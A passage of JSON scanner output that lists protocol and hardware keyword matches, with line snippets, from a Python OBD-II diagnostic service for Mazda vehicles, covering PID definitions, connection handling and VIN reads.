"line": 242, "protocol": "PID", "content": "\"B4\": OBDPID(\"B4\", \"Mazda Acceleration Enrichment\", \"Acceleration enrichment\", \"%\", 0, 50, \"A*0.2\", "}, {"type": "protocol", "line": 243, "protocol": "OBD", "content": "\"B5\": OBDPID(\"B5\", \"Mazda Deceleration Fuel Cut\", \"Deceleration fuel cut status\", \"\", 0, 1, \"A&0x01\""}, {"type": "protocol", "line": 243, "protocol": "0x[0-9A-Fa-f]+", "content": "\"B5\": OBDPID(\"B5\", \"Mazda Deceleration Fuel Cut\", \"Deceleration fuel cut status\", \"\", 0, 1, \"A&0x01\""}, {"type": "protocol", "line": 243, "protocol": "PID", "content": "\"B5\": OBDPID(\"B5\", \"Mazda Deceleration Fuel Cut\", \"Deceleration fuel cut status\", \"\", 0, 1, \"A&0x01\""}, {"type": "protocol", "line": 244, "protocol": "OBD", "content": "\"B6\": OBDPID(\"B6\", \"Mazda Boost Control Mode\", \"Boost control mode\", \"\", 0, 3, \"A\", \"int\", True, Sec"}, {"type": "protocol", "line": 244, "protocol": "PID", "content": "\"B6\": OBDPID(\"B6\", \"Mazda Boost Control Mode\", \"Boost control mode\", \"\", 0, 3, \"A\", \"int\", True, Sec"}, {"type": "protocol", "line": 245, "protocol": "OBD", "content": "\"B7\": OBDPID(\"B7\", \"Mazda Wastegate Mode\", \"Wastegate control mode\", \"\", 0, 2, \"A\", \"int\", True, Sec"}, {"type": "protocol", "line": 245, "protocol": "PID", "content": "\"B7\": OBDPID(\"B7\", \"Mazda Wastegate Mode\", \"Wastegate control mode\", \"\", 0, 2, \"A\", \"int\", True, Sec"}, {"type": "protocol", "line": 246, "protocol": "OBD", "content": "\"B8\": OBDPID(\"B8\", \"Mazda TCS Status\", \"Traction control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "protocol", "line": 246, "protocol": "0x[0-9A-Fa-f]+", "content": "\"B8\": OBDPID(\"B8\", \"Mazda TCS Status\", \"Traction control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "protocol", "line": 246, "protocol": "PID", "content": "\"B8\": OBDPID(\"B8\", \"Mazda TCS Status\", \"Traction control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "protocol", "line": 247, "protocol": "OBD", "content": "\"B9\": OBDPID(\"B9\", \"Mazda ABS Status\", \"ABS system status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Securi"}, {"type": "protocol", "line": 247, "protocol": "0x[0-9A-Fa-f]+", "content": "\"B9\": OBDPID(\"B9\", \"Mazda ABS Status\", \"ABS system status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Securi"}, {"type": "protocol", "line": 247, "protocol": "PID", "content": "\"B9\": OBDPID(\"B9\", \"Mazda ABS Status\", \"ABS system status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Securi"}, {"type": "protocol", "line": 248, "protocol": "OBD", "content": "\"BA\": OBDPID(\"BA\", \"Mazda Cruise Control\", \"Cruise control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BA\": OBDPID(\"BA\", \"Mazda Cruise Control\", \"Cruise control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True"}, {"type": "protocol", "line": 248, "protocol": "PID", "content": "\"BA\": OBDPID(\"BA\", \"Mazda Cruise Control\", \"Cruise control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True"}, {"type": "protocol", "line": 249, "protocol": "OBD", "content": "\"BB\": OBDPID(\"BB\", \"Mazda AC Compressor\", \"AC compressor status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "protocol", "line": 249, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BB\": OBDPID(\"BB\", \"Mazda AC Compressor\", \"AC compressor status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "protocol", "line": 249, "protocol": "PID", "content": "\"BB\": OBDPID(\"BB\", \"Mazda AC Compressor\", \"AC compressor status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "protocol", "line": 250, "protocol": "OBD", "content": "\"BC\": OBDPID(\"BC\", \"Mazda Radiator Fan\", \"Radiator fan status\", \"\", 0, 3, \"A\", \"int\", True, Security"}, {"type": "protocol", "line": 250, "protocol": "PID", "content": "\"BC\": OBDPID(\"BC\", \"Mazda Radiator Fan\", \"Radiator fan status\", \"\", 0, 3, \"A\", \"int\", True, Security"}, {"type": "protocol", "line": 251, "protocol": "OBD", "content": "\"BD\": OBDPID(\"BD\", \"Mazda Fuel Pump\", \"Fuel pump status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Security"}, {"type": "protocol", "line": 251, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BD\": OBDPID(\"BD\", \"Mazda Fuel Pump\", \"Fuel pump status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Security"}, {"type": "protocol", "line": 251, "protocol": "PID", "content": "\"BD\": OBDPID(\"BD\", \"Mazda Fuel Pump\", \"Fuel pump status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Security"}, {"type": "protocol", "line": 252, "protocol": "OBD", "content": "\"BE\": OBDPID(\"BE\", \"Mazda Check Engine\", \"Check engine light status\", \"\", 0, 1, \"A&0x80\", \"bool\", Tr"}, {"type": "protocol", "line": 252, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BE\": OBDPID(\"BE\", \"Mazda Check Engine\", \"Check engine light status\", \"\", 0, 1, \"A&0x80\", \"bool\", Tr"}, {"type": "protocol", "line": 252, "protocol": "PID", "content": "\"BE\": OBDPID(\"BE\", \"Mazda Check Engine\", \"Check engine light status\", \"\", 0, 1, \"A&0x80\", \"bool\", Tr"}, {"type": "protocol", "line": 253, "protocol": "OBD", "content": "\"BF\": OBDPID(\"BF\", \"Mazda Security Light\", \"Security indicator status\", \"\", 0, 1, \"A&0x01\", \"bool\", "}, {"type": "protocol", "line": 253, "protocol": "0x[0-9A-Fa-f]+", "content": "\"BF\": OBDPID(\"BF\", \"Mazda Security Light\", \"Security indicator status\", \"\", 0, 1, \"A&0x01\", \"bool\", "}, {"type": "protocol", "line": 253, "protocol": "PID", "content": "\"BF\": OBDPID(\"BF\", \"Mazda Security Light\", \"Security indicator status\", \"\", 0, 1, \"A&0x01\", \"bool\", "}, {"type": "protocol", "line": 257, "protocol": "OBD", "content": "def get_pid(cls, pid: str, mazda_specific: bool = False) -> Optional[OBDPID]:"}, {"type": "protocol", "line": 257, "protocol": "PID", "content": "def get_pid(cls, pid: str, mazda_specific: bool = False) -> Optional[OBDPID]:"}, {"type": "protocol", "line": 258, "protocol": "PID", "content": "\"\"\"Get PID definition.\"\"\""}, {"type": "protocol", "line": 260, "protocol": "PID", "content": "return cls.MAZDA_SPECIFIC_PIDS.get(pid.upper())"}, {"type": "protocol", "line": 261, "protocol": "PID", "content": "return cls.STANDARD_PIDS.get(pid.upper())"}, {"type": "protocol", "line": 264, "protocol": "OBD", "content": "def get_all_pids(cls, mazda_specific: bool = False) -> Dict[str, OBDPID]:"}, {"type": "protocol", "line": 264, "protocol": "PID", "content": "def get_all_pids(cls, mazda_specific: bool = False) -> Dict[str, OBDPID]:"}, {"type": "protocol", "line": 265, "protocol": "PID", "content": "\"\"\"Get all PIDs.\"\"\""}, {"type": "protocol", "line": 267, "protocol": "PID", "content": "return cls.MAZDA_SPECIFIC_PIDS.copy()"}, {"type": "protocol", "line": 268, "protocol": "PID", "content": "return cls.STANDARD_PIDS.copy()"}, {"type": "protocol", "line": 271, "protocol": "OBD", "content": "def search_pids(cls, search_term: str, mazda_specific: bool = False) -> List[OBDPID]:"}, {"type": "protocol", "line": 271, "protocol": "PID", "content": "def search_pids(cls, search_term: str, mazda_specific: bool = False) -> List[OBDPID]:"}, {"type": "protocol", "line": 272, "protocol": "PID", "content": "\"\"\"Search PIDs by name or description.\"\"\""}, {"type": "protocol", "line": 285, "protocol": "OBD", "content": "class MazdaOBDService:"}, {"type": "protocol", "line": 287, "protocol": "CAN", "content": "OBD-II service for Mazda vehicles with primary focus on ISO-15765-4 (CAN)."}, {"type": "protocol", "line": 287, "protocol": "OBD", "content": "OBD-II service for Mazda vehicles with primary focus on ISO-15765-4 (CAN)."}, {"type": "protocol", "line": 288, "protocol": "PID", "content": "Provides communication abstraction and PID handling."}, {"type": "protocol", "line": 291, "protocol": "OBD", "content": "def __init__(self, protocol: OBDProtocol = OBDProtocol.ISO_15765_4):"}, {"type": "protocol", "line": 293, "protocol": "OBD", "content": "Initialize OBD service."}, {"type": "protocol", "line": 296, "protocol": "OBD", "content": "protocol: OBD protocol to use"}, {"type": "protocol", "line": 300, "protocol": "PID", "content": "self.pid_registry = MazdaPIDRegistry()"}, {"type": "protocol", "line": 314, "protocol": "OBD", "content": "OBDProtocol.ISO_15765_4: {"}, {"type": "protocol", "line": 315, "protocol": "0x[0-9A-Fa-f]+", "content": "\"can_id_request\": 0x7DF,"}, {"type": "protocol", "line": 316, "protocol": "0x[0-9A-Fa-f]+", "content": "\"can_id_response\": 0x7E8,"}, {"type": "protocol", "line": 322, "protocol": "OBD", "content": "OBDProtocol.ISO_9141_2: {"}, {"type": "protocol", "line": 324, "protocol": "0x[0-9A-Fa-f]+", "content": "\"init_bytes\": [0x33, 0x01, 0x8D],"}, {"type": "protocol", "line": 325, "protocol": "0x[0-9A-Fa-f]+", "content": "\"kb1\": 0x01,"}, {"type": "protocol", "line": 326, "protocol": "0x[0-9A-Fa-f]+", "content": "\"kb2\": 0x8D,"}, {"type": "protocol", "line": 328, "protocol": "OBD", "content": "OBDProtocol.ISO_14230_4: {"}, {"type": "protocol", "line": 335, "protocol": "OBD", "content": "self.logger.info(f\"MazdaOBDService initialized with protocol: {protocol.value}\")"}, {"type": "protocol", "line": 338, "protocol": "CAN", "content": "\"\"\"Set communication interface (CAN adapter, serial port, etc.).\"\"\""}, {"type": "protocol", "line": 344, "protocol": "OBD", "content": "Establish OBD connection."}, {"type": "protocol", "line": 350, "protocol": "OBD", "content": "raise OBDError(\"No communication interface set\")"}, {"type": "protocol", "line": 354, "protocol": "OBD", "content": "if self.protocol == OBDProtocol.ISO_15765_4:"}, {"type": "protocol", "line": 356, "protocol": "OBD", "content": "elif self.protocol == OBDProtocol.ISO_9141_2:"}, {"type": "protocol", "line": 358, "protocol": "OBD", "content": "elif self.protocol == OBDProtocol.ISO_14230_4:"}, {"type": "protocol", "line": 361, "protocol": "OBD", "content": "raise OBDProtocolError(f\"Unsupported protocol: {self.protocol}\")"}, {"type": "protocol", "line": 365, "protocol": "OBD", "content": "self.logger.info(f\"OBD connection established using {self.protocol.value}\")"}, {"type": "protocol", "line": 368, "protocol": "OBD", "content": "self.logger.error(\"Failed to establish OBD connection\")"}, {"type": "protocol", "line": 372, "protocol": "OBD", "content": "self.logger.error(f\"OBD connection failed: {e}\")"}, {"type": "protocol", "line": 373, "protocol": "OBD", "content": "raise OBDError(f\"Connection failed: {e}\")"}, {"type": "protocol", "line": 376, "protocol": "OBD", "content": "\"\"\"Close OBD connection.\"\"\""}, {"type": "protocol", "line": 386, "protocol": "OBD", "content": "self.logger.info(\"OBD connection closed\")"}, {"type": "protocol", "line": 389, "protocol": "CAN", "content": "\"\"\"Connect using ISO-15765-4 (CAN) protocol.\"\"\""}, {"type": "protocol", "line": 413, "protocol": "KWP", "content": "\"\"\"Connect using ISO-14230-4 (KWP2000) protocol.\"\"\""}, {"type": "protocol", "line": 424, "protocol": "OBD", "content": "async def send_command(self, mode: OBDCommandMode, pid: str = \"\","}, {"type": "protocol", "line": 426, "protocol": "OBD", "content": "credentials: Optional[SecurityCredentials] = None) -> OBDPacket:"}, {"type": "protocol", "line": 428, "protocol": "OBD", "content": "Send OBD command and receive response."}, {"type": "protocol", "line": 431, "protocol": "OBD", "content": "mode: OBD command mode"}, {"type": "protocol", "line": 440, "protocol": "OBD", "content": "raise OBDError(\"Not connected to OBD interface\")"}, {"type": "protocol", "line": 443, "protocol": "PID", "content": "if credentials and pid.upper() in self.pid_registry.MAZDA_SPECIFIC_PIDS:"}, {"type": "protocol", "line": 446, "protocol": "OBD", "content": "raise OBDError(f\"Insufficient security level for PID {pid}\")"}, {"type": "protocol", "line": 446, "protocol": "PID", "content": "raise OBDError(f\"Insufficient security level for PID {pid}\")"}, {"type": "protocol", "line": 455, "protocol": "OBD", "content": "packet = OBDPacket("}, {"type": "protocol", "line": 476, "protocol": "OBD", "content": "except OBDTimeoutError:"}, {"type": "protocol", "line": 485, "protocol": "OBD", "content": "raise OBDError(f\"Command failed after {self.max_retries} attempts: {e}\")"}, {"type": "protocol", "line": 488, "protocol": "OBD", "content": "async def _send_packet_with_retry(self, packet: OBDPacket) -> OBDPacket:"}, {"type": "protocol", "line": 491, "protocol": "OBD", "content": "raise OBDError(\"No communication interface available\")"}, {"type": "protocol", "line": 494, "protocol": "OBD", "content": "if self.protocol == OBDProtocol.ISO_15765_4:"}, {"type": "protocol", "line": 496, "protocol": "OBD", "content": "elif self.protocol in [OBDProtocol.ISO_9141_2, OBDProtocol.ISO_14230_4]:"}, {"type": "protocol", "line": 499, "protocol": "OBD", "content": "raise OBDProtocolError(f\"Unsupported protocol: {self.protocol}\")"}, {"type": "protocol", "line": 501, "protocol": "OBD", "content": "async def _send_can_packet(self, packet: OBDPacket) -> OBDPacket:"}, {"type": "protocol", "line": 502, "protocol": "CAN", "content": "\"\"\"Send packet using CAN protocol.\"\"\""}, {"type": "protocol", "line": 518, "protocol": "CAN", "content": "raise OBDError(\"CAN interface does not support send_can_message\")"}, {"type": "protocol", "line": 518, "protocol": "OBD", "content": "raise OBDError(\"CAN interface does not support send_can_message\")"}, {"type": "protocol", "line": 523, "protocol": "OBD", "content": "async def _send_serial_packet(self, packet: OBDPacket) -> OBDPacket:"}, {"type": "protocol", "line": 532, "protocol": "OBD", "content": "raise OBDError(\"Serial interface does not support send_serial_packet\")"}, {"type": "protocol", "line": 536, "protocol": "OBD", "content": "def _build_can_message(self, packet: OBDPacket) -> bytes:"}, {"type": "protocol", "line": 537, "protocol": "CAN", "content": "\"\"\"Build CAN message from OBD packet.\"\"\""}, {"type": "protocol", "line": 537, "protocol": "OBD", "content": "\"\"\"Build CAN message from OBD packet.\"\"\""}, {"type": "protocol", "line": 541, "protocol": "0x[0-9A-Fa-f]+", "content": "can_data = bytes([0x00])  # Single frame, length"}, {"type": "protocol", "line": 547, "protocol": "OBD", "content": "original_packet: OBDPacket) -> OBDPacket:"}, {"type": "protocol", "line": 548, "protocol": "CAN", "content": "\"\"\"Parse CAN response data.\"\"\""}, {"type": "protocol", "line": 550, "protocol": "OBD", "content": "raise OBDError(\"Empty response received\")"}, {"type": "protocol", "line": 553, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(response_data) > 3 and response_data[0] == 0x00:"}, {"type": "protocol", "line": 558, "protocol": "OBD", "content": "return OBDPacket("}, {"type": "protocol", "line": 566, "protocol": "OBD", "content": "original_packet: OBDPacket) -> OBDPacket:"}, {"type": "protocol", "line": 569, "protocol": "OBD", "content": "return OBDPacket("}, {"type": "protocol", "line": 576, "protocol": "OBD", "content": "def _check_security(self, credentials: SecurityCredentials, pid: OBDPID) -> bool:"}, {"type": "protocol", "line": 576, "protocol": "PID", "content": "def _check_security(self, credentials: SecurityCredentials, pid: OBDPID) -> bool:"}, {"type": "protocol", "line": 577, "protocol": "PID", "content": "\"\"\"Check if user has sufficient security level for PID.\"\"\""}, {"type": "protocol", "line": 586, "protocol": "PID", "content": "Read specific PID value."}, {"type": "protocol", "line": 589, "protocol": "PID", "content": "pid: PID to read (hex string)"}, {"type": "protocol", "line": 590, "protocol": "PID", "content": "mazda_specific: Whether to read Mazda-specific PID"}, {"type": "protocol", "line": 594, "protocol": "PID", "content": "Parsed PID value"}, {"type": "protocol", "line": 598, "protocol": "OBD", "content": "raise OBDError(f\"Unknown PID: {pid}\")"}, {"type": "protocol", "line": 598, "protocol": "PID", "content": "raise OBDError(f\"Unknown PID: {pid}\")"}, {"type": "protocol", "line": 602, "protocol": "OBD", "content": "OBDCommandMode.DEFAULT, pid, credentials=credentials"}, {"type": "protocol", "line": 607, "protocol": "OBD", "content": "raise OBDError(f\"Invalid response for PID {pid}\")"}, {"type": "protocol", "line": 607, "protocol": "PID", "content": "raise OBDError(f\"Invalid response for PID {pid}\")"}, {"type": "protocol", "line": 657, "protocol": "PID", "content": "self.logger.warning(f\"Failed to read PID {pid}: {e}\")"}, {"type": "protocol", "line": 666, "protocol": "PID", "content": "self.logger.warning(f\"Failed to read Mazda PID {pid}: {e}\")"}, {"type": "protocol", "line": 672, "protocol": "PID", "content": "Get list of supported PIDs."}, {"type": "protocol", "line": 678, "protocol": "PID", "content": "List of supported PID hex strings"}, {"type": "protocol", "line": 680, "protocol": "OBD", "content": "response = await self.send_command(OBDCommandMode.DEFAULT, \"00\", credentials=credentials)"}, {"type": "protocol", "line": 693, "protocol": "0x[0-9A-Fa-f]+", "content": "if pid_num <= 0x20:  # PIDs 01-20"}, {"type": "protocol", "line": 693, "protocol": "PID", "content": "if pid_num <= 0x20:  # PIDs 01-20"}, {"type": "protocol", "line": 715, "protocol": "OBD", "content": "response = await self.send_command(OBDCommandMode.CLEAR_DTC, credentials=credentials)"}, {"type": "protocol", "line": 718, "protocol": "0x[0-9A-Fa-f]+", "content": "if len(response.data) >= 1 and response.data[0] == 0x44:  # 0x04 + 0x40"}, {"type": "protocol", "line": 735, "protocol": "OBD", "content": "response = await self.send_command(OBDCommandMode.VEHICLE_INFO, \"2\", credentials=credentials)"}, {"type": "protocol", "line": 738, "protocol": "OBD", "content": "raise OBDError(\"Invalid VIN response\")"}, {"type": "protocol", "line": 761, "protocol": "OBD", "content": "response = await self.send_command(OBDCommandMode.VEHICLE_INFO, \"6\", credentials=credentials)"}, {"type": "protocol", "line": 770, "protocol": "OBD", "content": "response = await self.send_command(OBDCommandMode.VEHICLE_INFO, \"12\", credentials=credentials)"}, {"type": "protocol", "line": 796, "protocol": "OBD", "content": "self.logger.warning(\"OBDService deleted while still connected\")"}], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "vehicle", "content": "MazdaOBDService - OBD-II communication protocols for Mazda vehicles."}, {"type": "hardware", "line": 3, "hardware": "ABS", "content": "Primary focus on ISO-15765-4 (CAN) protocol with abstraction for other protocols."}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "SecurityLevel, SecurityCredentials, LogEntry"}, {"type": "hardware", "line": 31, "hardware": "vehicle", "content": "VEHICLE_INFO = \"09\"  # Vehicle information"}, {"type": "hardware", "line": 44, "hardware": "ECU", "content": "SECURITY_ACCESS_DENIED = \"33\""}, {"type": "hardware", "line": 59, "hardware": "ECU", "content": "security_level: SecurityLevel = SecurityLevel.READ_ONLY"}, {"type": "hardware", "line": 66, "hardware": "ECU", "content": "data: Raw data bytes from ECU"}, {"type": "hardware", "line": 142, "hardware": "ABS", "content": "\"0B\": OBDPID(\"0B\", \"Intake Manifold Absolute Pressure\", \"MAP sensor reading\", \"kPa\", 0, 255, \"A\", \"f"}, {"type": "hardware", "line": 144, "hardware": "vehicle", "content": "\"0D\": OBDPID(\"0D\", \"Vehicle Speed\", \"Vehicle speed sensor\", \"km/h\", 0, 255, \"A\", \"float\"),"}, {"type": "hardware", "line": 152, "hardware": "vehicle", "content": "\"1C\": OBDPID(\"1C\", \"OBD Standards\", \"OBD standards this vehicle conforms to\", \"\", 0, 0, \"A\", \"int\"),"}, {"type": "hardware", "line": 159, "hardware": "ECU", "content": "\"2C\": OBDPID(\"2C\", \"ECU Name\", \"ECU identification\", \"\", 0, 0, \"string\", \"string\"),"}, {"type": "hardware", "line": 160, "hardware": "vehicle", "content": "\"2D\": OBDPID(\"2D\", \"VIN Number\", \"Vehicle identification number\", \"\", 0, 0, \"string\", \"string\"),"}, {"type": "hardware", "line": 161, "hardware": "ECU", "content": "\"2E\": OBDPID(\"2E\", \"Calibration ID\", \"ECU calibration identification\", \"\", 0, 0, \"string\", \"string\")"}, {"type": "hardware", "line": 164, "hardware": "ABS", "content": "\"33\": OBDPID(\"33\", \"Absolute Barometric Pressure\", \"Barometric pressure\", \"kPa\", 0, 255, \"A\", \"float"}, {"type": "hardware", "line": 166, "hardware": "ABS", "content": "\"43\": OBDPID(\"43\", \"Absolute Load Value\", \"Absolute engine load\", \"%\", 0, 25700, \"A*100/255\", \"float"}, {"type": "hardware", "line": 170, "hardware": "ABS", "content": "\"47\": OBDPID(\"47\", \"Absolute Throttle Position B\", \"Absolute throttle position B\", \"%\", 0, 100, \"A*1"}, {"type": "hardware", "line": 171, "hardware": "ABS", "content": "\"48\": OBDPID(\"48\", \"Absolute Throttle Position C\", \"Absolute throttle position C\", \"%\", 0, 100, \"A*1"}, {"type": "hardware", "line": 179, "hardware": "ABS", "content": "\"53\": OBDPID(\"53\", \"Absolute Evap System Vapor Pressure\", \"Evap system vapor pressure\", \"kPa\", 0, 32"}, {"type": "hardware", "line": 200, "hardware": "ABS", "content": "\"6E\": OBDPID(\"6E\", \"Fuel Rail Absolute Pressure\", \"Fuel rail absolute pressure\", \"kPa\", 0, 65535, \"A"}, {"type": "hardware", "line": 222, "hardware": "ECU", "content": "\"A0\": OBDPID(\"A0\", \"Mazda Boost Target\", \"Target boost pressure\", \"psi\", 0, 30, \"A*0.145\", \"float\", "}, {"type": "hardware", "line": 223, "hardware": "ECU", "content": "\"A1\": OBDPID(\"A1\", \"Mazda Boost Actual\", \"Actual boost pressure\", \"psi\", 0, 30, \"A*0.145\", \"float\", "}, {"type": "hardware", "line": 224, "hardware": "ECU", "content": "\"A2\": OBDPID(\"A2\", \"Mazda Wastegate Duty\", \"Wastegate duty cycle\", \"%\", 0, 100, \"A*100/255\", \"float\""}, {"type": "hardware", "line": 225, "hardware": "ECU", "content": "\"A3\": OBDPID(\"A3\", \"Mazda Ignition Timing\", \"Ignition timing advance\", \"\u00b0\", -20, 60, \"A-20\", \"float\""}, {"type": "hardware", "line": 226, "hardware": "ECU", "content": "\"A4\": OBDPID(\"A4\", \"Mazda Fuel Pressure\", \"High pressure fuel pump\", \"MPa\", 0, 200, \"A*0.1\", \"float\""}, {"type": "hardware", "line": 227, "hardware": "ECU", "content": "\"A5\": OBDPID(\"A5\", \"Mazda Knock Retard\", \"Knock retard\", \"\u00b0\", 0, 20, \"A*0.25\", \"float\", True, Securi"}, {"type": "hardware", "line": 228, "hardware": "ECU", "content": "\"A6\": OBDPID(\"A6\", \"Mazda Oil Pressure\", \"Oil pressure\", \"psi\", 0, 100, \"A*0.5\", \"float\", True, Secu"}, {"type": "hardware", "line": 229, "hardware": "ECU", "content": "\"A7\": OBDPID(\"A7\", \"Mazda Transmission Gear\", \"Current gear\", \"\", 0, 6, \"A\", \"int\", True, SecurityLe"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "\"A8\": OBDPID(\"A8\", \"Mazda Torque Request\", \"Torque request\", \"Nm\", 0, 400, \"A*2\", \"float\", True, Sec"}, {"type": "hardware", "line": 231, "hardware": "ECU", "content": "\"A9\": OBDPID(\"A9\", \"Mazda Torque Actual\", \"Actual torque\", \"Nm\", 0, 400, \"A*2\", \"float\", True, Secur"}, {"type": "hardware", "line": 232, "hardware": "ECU", "content": "\"AA\": OBDPID(\"AA\", \"Mazda AFR Target\", \"Target AFR\", \"\", 10, 20, \"A*0.1+10\", \"float\", True, Security"}, {"type": "hardware", "line": 233, "hardware": "ECU", "content": "\"AB\": OBDPID(\"AB\", \"Mazda AFR Actual\", \"Actual AFR\", \"\", 10, 20, \"A*0.1+10\", \"float\", True, Security"}, {"type": "hardware", "line": 234, "hardware": "ECU", "content": "\"AC\": OBDPID(\"AC\", \"Mazda Dwell Time\", \"Ignition coil dwell\", \"ms\", 0, 10, \"A*0.04\", \"float\", True, "}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "\"AD\": OBDPID(\"AD\", \"Mazda Valve Timing\", \"Valve timing advance\", \"\u00b0\", -20, 60, \"A-20\", \"float\", True"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "\"AE\": OBDPID(\"AE\", \"Mazda Throttle Desired\", \"Desired throttle position\", \"%\", 0, 100, \"A*100/255\", "}, {"type": "hardware", "line": 237, "hardware": "ECU", "content": "\"AF\": OBDPID(\"AF\", \"Mazda Fuel Trim Bank 1\", \"Bank 1 fuel trim\", \"%\", -25, 25, \"A*0.5-25\", \"float\", "}, {"type": "hardware", "line": 238, "hardware": "ECU", "content": "\"B0\": OBDPID(\"B0\", \"Mazda Fuel Trim Bank 2\", \"Bank 2 fuel trim\", \"%\", -25, 25, \"A*0.5-25\", \"float\", "}, {"type": "hardware", "line": 239, "hardware": "ECU", "content": "\"B1\": OBDPID(\"B1\", \"Mazda ECU Temperature\", \"ECU internal temperature\", \"\u00b0C\", -40, 125, \"A-40\", \"flo"}, {"type": "hardware", "line": 240, "hardware": "ECU", "content": "\"B2\": OBDPID(\"B2\", \"Mazda Battery Voltage\", \"Battery voltage\", \"V\", 0, 20, \"A*0.08\", \"float\", True, "}, {"type": "hardware", "line": 241, "hardware": "ECU", "content": "\"B3\": OBDPID(\"B3\", \"Mazda Load Absolute\", \"Absolute engine load\", \"%\", 0, 100, \"A*100/255\", \"float\","}, {"type": "hardware", "line": 241, "hardware": "ABS", "content": "\"B3\": OBDPID(\"B3\", \"Mazda Load Absolute\", \"Absolute engine load\", \"%\", 0, 100, \"A*100/255\", \"float\","}, {"type": "hardware", "line": 242, "hardware": "ECU", "content": "\"B4\": OBDPID(\"B4\", \"Mazda Acceleration Enrichment\", \"Acceleration enrichment\", \"%\", 0, 50, \"A*0.2\", "}, {"type": "hardware", "line": 243, "hardware": "ECU", "content": "\"B5\": OBDPID(\"B5\", \"Mazda Deceleration Fuel Cut\", \"Deceleration fuel cut status\", \"\", 0, 1, \"A&0x01\""}, {"type": "hardware", "line": 244, "hardware": "ECU", "content": "\"B6\": OBDPID(\"B6\", \"Mazda Boost Control Mode\", \"Boost control mode\", \"\", 0, 3, \"A\", \"int\", True, Sec"}, {"type": "hardware", "line": 245, "hardware": "ECU", "content": "\"B7\": OBDPID(\"B7\", \"Mazda Wastegate Mode\", \"Wastegate control mode\", \"\", 0, 2, \"A\", \"int\", True, Sec"}, {"type": "hardware", "line": 246, "hardware": "ECU", "content": "\"B8\": OBDPID(\"B8\", \"Mazda TCS Status\", \"Traction control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "hardware", "line": 247, "hardware": "ECU", "content": "\"B9\": OBDPID(\"B9\", \"Mazda ABS Status\", \"ABS system status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Securi"}, {"type": "hardware", "line": 247, "hardware": "ABS", "content": "\"B9\": OBDPID(\"B9\", \"Mazda ABS Status\", \"ABS system status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Securi"}, {"type": "hardware", "line": 248, "hardware": "ECU", "content": "\"BA\": OBDPID(\"BA\", \"Mazda Cruise Control\", \"Cruise control status\", \"\", 0, 1, \"A&0x01\", \"bool\", True"}, {"type": "hardware", "line": 249, "hardware": "ECU", "content": "\"BB\": OBDPID(\"BB\", \"Mazda AC Compressor\", \"AC compressor status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, "}, {"type": "hardware", "line": 250, "hardware": "ECU", "content": "\"BC\": OBDPID(\"BC\", \"Mazda Radiator Fan\", \"Radiator fan status\", \"\", 0, 3, \"A\", \"int\", True, Security"}, {"type": "hardware", "line": 251, "hardware": "ECU", "content": "\"BD\": OBDPID(\"BD\", \"Mazda Fuel Pump\", \"Fuel pump status\", \"\", 0, 1, \"A&0x01\", \"bool\", True, Security"}, {"type": "hardware", "line": 252, "hardware": "ECU", "content": "\"BE\": OBDPID(\"BE\", \"Mazda Check Engine\", \"Check engine light status\", \"\", 0, 1, \"A&0x80\", \"bool\", Tr"}, {"type": "hardware", "line": 253, "hardware": "ECU", "content": "\"BF\": OBDPID(\"BF\", \"Mazda Security Light\", \"Security indicator status\", \"\", 0, 1, \"A&0x01\", \"bool\", "}, {"type": "hardware", "line": 287, "hardware": "vehicle", "content": "OBD-II service for Mazda vehicles with primary focus on ISO-15765-4 (CAN)."}, {"type": "hardware", "line": 288, "hardware": "ABS", "content": "Provides communication abstraction and PID handling."}, {"type": "hardware", "line": 426, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> OBDPacket:"}, {"type": "hardware", "line": 434, "hardware": "ECU", "content": "credentials: Security credentials for authorization"}, {"type": "hardware", "line": 445, "hardware": "ECU", "content": "if mazda_pid and not self._check_security(credentials, mazda_pid):"}, {"type": "hardware", "line": 446, "hardware": "ECU", "content": "raise OBDError(f\"Insufficient security level for PID {pid}\")"}, {"type": "hardware", "line": 576, "hardware": "ECU", "content": "def _check_security(self, credentials: SecurityCredentials, pid: OBDPID) -> bool:"}, {"type": "hardware", "line": 577, "hardware": "ECU", "content": "\"\"\"Check if user has sufficient security level for PID.\"\"\""}, {"type": "hardware", "line": 579, "hardware": "ECU", "content": "return pid.security_level == SecurityLevel.NONE"}, {"type": "hardware", "line": 581, "hardware": "ECU", "content": "return credentials.security_level.value >= pid.security_level.value"}, {"type": "hardware", "line": 584, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> Union[float, int, bool, str]:"}, {"type": "hardware", "line": 591, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 614, "hardware": "ECU", "content": "credentials: Optional[SecurityCredentials] = None) -> TelemetryData:"}, {"type": "hardware", "line": 619, "hardware": "ECU", "content": "credentials: Security credentials"}, {"type": "hardware", "line": 635, "hardware": "vehicle", "content": "\"0D\": \"vehicle_speed\","}, 